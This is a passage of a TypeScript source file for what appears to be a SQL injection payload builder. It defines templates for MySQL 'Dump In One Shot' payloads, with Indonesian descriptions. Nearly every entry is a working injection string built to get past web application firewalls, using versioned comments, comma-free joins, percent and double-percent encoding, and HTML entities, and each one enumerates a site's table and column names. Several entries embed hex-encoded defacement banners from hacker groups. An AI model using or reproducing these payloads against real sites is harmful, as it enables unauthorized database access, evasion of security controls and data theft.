    content: "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) UNION (SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)"
  },
  {
    id: 'waf-dios-no-comma-subselect-compare',
    name: 'No Commas Subselect Greater-Than DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'greater-than', 'enumeration'],
    description: 'Pencarian kolom berikutnya menggunakan operator perbandingan > tanpa koma',
    content: "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() AND table_name > 0x00 ORDER BY table_name ASC LIMIT 1)"
  },
  {
    id: 'waf-dios-no-comma-having-filter',
    name: 'No Commas HAVING Condition DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'having', 'aggregate'],
    description: 'Filter ekstraksi tabel menggunakan HAVING tanpa menggunakan koma',
    content: "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() GROUP BY table_name HAVING count(table_name)=1 LIMIT 1)"
  },
  {
    id: 'waf-dios-no-comma-inner-join-sub',
    name: 'No Commas INNER JOIN Subquery DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'inner-join', 'no-comma'],
    description: 'Penggabungan kolom dan tabel via INNER JOIN tanpa koma',
    content: "(SELECT table_name FROM information_schema.tables INNER JOIN information_schema.columns USING(table_name) WHERE tables.table_schema=database() LIMIT 1)"
  },
  {
    id: 'waf-dios-no-comma-straight-join',
    name: 'No Commas STRAIGHT_JOIN DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'straight-join', 'optimizer-bypass'],
    description: 'STRAIGHT_JOIN untuk memaksa optimizer MySQL mengeksekusi subquery tanpa koma',
    content: "(SELECT table_name FROM information_schema.tables STRAIGHT_JOIN information_schema.columns USING(table_name) WHERE tables.table_schema=database() LIMIT 1)"
  },
  {
    id: 'waf-dios-no-comma-left-join',
    name: 'No Commas LEFT JOIN USING DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'left-join', 'no-comma'],
    description: 'Ekstraksi nama tabel skema via LEFT JOIN USING tanpa koma',
    content: "(SELECT table_name FROM information_schema.tables LEFT JOIN information_schema.columns USING(table_name) WHERE tables.table_schema=database() LIMIT 1)"
  },
  {
    id: 'waf-dios-no-comma-right-join',
    name: 'No Commas RIGHT JOIN USING DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'right-join', 'no-comma'],
    description: 'Ekstraksi nama tabel skema via RIGHT JOIN USING tanpa koma',
    content: "(SELECT table_name FROM information_schema.tables RIGHT JOIN information_schema.columns USING(table_name) WHERE columns.table_schema=database() LIMIT 1)"
  }
];

// ============================================================================
// 5. CLASSIC WAF SIGNATURES — 12 Templates
// ============================================================================
const classicWafSignaturesDiosTemplates: BuilderTemplate[] = [
  {
    id: 'waf-dios-sig-zxmarchia-neon',
    name: 'WAF Injected by ZXMarchia (Neon Green Glow)',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'signature', 'zxmarchia', 'neon-green'],
    description: 'Signature ZXMarchia tebal hijau neon terbungkus komentar versi MySQL /*!50000...*/',
    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'waf-dios-sig-zxmarchia-red',
    name: 'WAF Injected by ZXMarchia (Neon Red Fire)',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'signature', 'zxmarchia', 'neon-red'],
    description: 'Signature ZXMarchia tebal merah menyala dengan pelindung WAF comment delimiters',
    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d234646333334343e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'waf-dios-sig-zxmarchia-cyan',
    name: 'WAF Injected by ZXMarchia (Cyber Cyan)',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'signature', 'zxmarchia', 'cyber-cyan'],
    description: 'Signature ZXMarchia biru elektrik menyala berpemisah komentar versi',
    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d233030464646463e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'waf-dios-sig-zxmarchia-ascii',
    name: 'WAF Injected by ZXMarchia (ASCII Frame)',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'signature', 'zxmarchia', 'ascii-frame'],
    description: 'Header ASCII frame ZXMarchia dengan bypass komentar versi MySQL',
    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x0a3d3d3d205b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d203d3d3d0a),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'waf-dios-sig-zxmarchia-sys-bypass',
    name: 'WAF ZXMarchia sys.schema Non-Info DIOS',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'signature', 'zxmarchia', 'sys-schema'],
    description: 'Header ZXMarchia Neon Green dengan tabel sistem sys.schema_auto_increment_columns',
    content: "(/*!50000SELECT*/(@n)/*!50000FROM*/(/*!50000SELECT*/(@n:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000sys.schema_auto_increment_columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@n)/*!50000AND*/(@n:=concat(@n,0x0a,table_name,0x3a,column_name))))n)"
  },
  {
    id: 'waf-dios-sig-sec-ninja',
    name: 'Sec-Ninja Style WAF Signature DIOS',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'sec-ninja', 'signature'],
    description: 'Format signature Sec-Ninja yang dirancang mengelabui analisis token WAF',
    content: "(/*!50000SELECT*/(@x)/*!50000FROM*/(/*!50000SELECT*/(@x:=0x0a2d2d5b205365632d4e696e6a61205d2d2d0a),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@x)/*!50000AND*/(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-sig-red-team',
    name: 'Red-Team Stealth WAF Signature DIOS',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'red-team', 'signature'],
    description: 'Header penanda operasi Red Team terbungkus komentar versi',
    content: "(/*!50000SELECT*/(@r)/*!50000FROM*/(/*!50000SELECT*/(@r:=0x0a5b20524544205445414d205d0a),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@r)/*!50000AND*/(@r:=concat(@r,0x0a,table_name,0x3a,column_name))))r)"
  },
  {
    id: 'waf-dios-sig-url-hex',
    name: 'URL Percent-Hex (%xx) WAF Signature DIOS',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'url-hex', 'signature'],
    description: 'Format kueri percent-encoded URL lengkap untuk bypass filter query string',
    content: "%28%2F%2A%2150000SELECT%2A%2F%28%40x%29%2F%2A%2150000FROM%2A%2F%28%2F%2A%2150000SELECT%2A%2F%28%40x%3A%3D0x00%29%2C%28%2F%2A%2150000SELECT%2A%2F%280%29%2F%2A%2150000FROM%2A%2F%28information_schema.columns%29%2F%2A%2150000WHERE%2A%2F%28table_schema%3Ddatabase%28%29%29AND%28%40x%29AND%28%40x%3A%3Dconcat%28%40x%2C0x0a%2Ctable_name%2C0x3a%2Ccolumn_name%29%29%29%29x%29"
  },
  {
    id: 'waf-dios-sig-double-hex',
    name: 'Double Percent-Hex (%25xx) WAF Signature DIOS',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'double-hex', 'signature'],
    description: 'Double percent encoding (%25xx) untuk reverse proxy dan gateway multi-tier',
    content: "%2528%252F%252A%252150000SELECT%252A%252F%2528%2540x%2529%252F%252A%252150000FROM%252A%252F%2528%252F%252A%252150000SELECT%252A%252F%2528%2540x%253A%253D0x00%2529%252C%2528%252F%252A%252150000SELECT%252A%252F%25280%2529%252F%252A%252150000FROM%252A%252F%2528information_schema.columns%2529%252F%252A%252150000WHERE%252A%252F%2528table_schema%253Ddatabase%2528%2529%2529AND%2528%2540x%2529AND%2528%2540x%253A%253Dconcat%2528%2540x%252C0x0a%252Ctable_name%252C0x3a%252Ccolumn_name%2529%2529%2529%2529x%2529"
  },
  {
    id: 'waf-dios-sig-html-entity',
    name: 'HTML Hex Entity (&#x..;) WAF Signature DIOS',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'html-hex', 'signature'],
    description: 'Format HTML entity hexadecimal untuk request yang di-decode oleh server backend',
    content: "(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;(@x)&#x46;&#x52;&#x4f;&#x4d;(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;(@x:=0x00),(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;(0)&#x46;&#x52;&#x4f;&#x4d;(information_schema.columns)&#x57;&#x48;&#x45;&#x52;&#x45;(table_schema=database())&#x41;&#x4e;&#x44;(@x)&#x41;&#x4e;&#x44;(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-sig-kamtiez-waf',
    name: 'KaMtiEz WAF Version Comment DIOS',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'kamtiez', 'signature'],
    description: 'Format signature KaMtiEz yang dibungkus komentar versi MySQL /*!50000...*/',
    content: "(/*!50000SELECT*/(@k)/*!50000FROM*/(/*!50000SELECT*/(@k:=0x0a2d2d3d204b614d7469457a2044494f53203d2d2d0a),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@k)/*!50000AND*/(@k:=concat(@k,0x0a,table_name,0x3a,column_name))))k)"
  },
  {
    id: 'waf-dios-sig-ozsec-waf',
    name: 'Oz-Sec Team WAF Version Comment DIOS',
    group: 'Classic WAF Signatures (Author / Popular Payloads)',
    tags: ['waf-bypass', 'oz-sec', 'signature'],
    description: 'Format signature Oz-Sec Team terbungkus komentar versi MySQL /*!50000...*/',
    content: "(/*!50000SELECT*/(@o)/*!50000FROM*/(/*!50000SELECT*/(@o:=0x2d2d5b204f7a2d536563205465616d205d2d2d0a),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@o)/*!50000AND*/(@o:=concat(@o,0x0a,table_name,0x3a,column_name))))o)"
  }
];

export const allWafDiosMysqlTemplates: BuilderTemplate[] = [
  ...wafEvasionDiosTemplates,
  ...wafVersionCommentsDiosTemplates,
  ...wafInlineCommentsDiosTemplates,
  ...wafNoCommasJoinDiosTemplates,
  ...classicWafSignaturesDiosTemplates
];

export const diosMysqlSubcategory: BuilderSubcategory = {
  id: 'dios-mysql',
  label: 'DIOS MySQL',
  description: 'WAF bypass MySQL Dump In One Shot templates (No Quotes, Comments, No Commas, Version Delimiters, WAF Signatures)',
  templates: allWafDiosMysqlTemplates
};
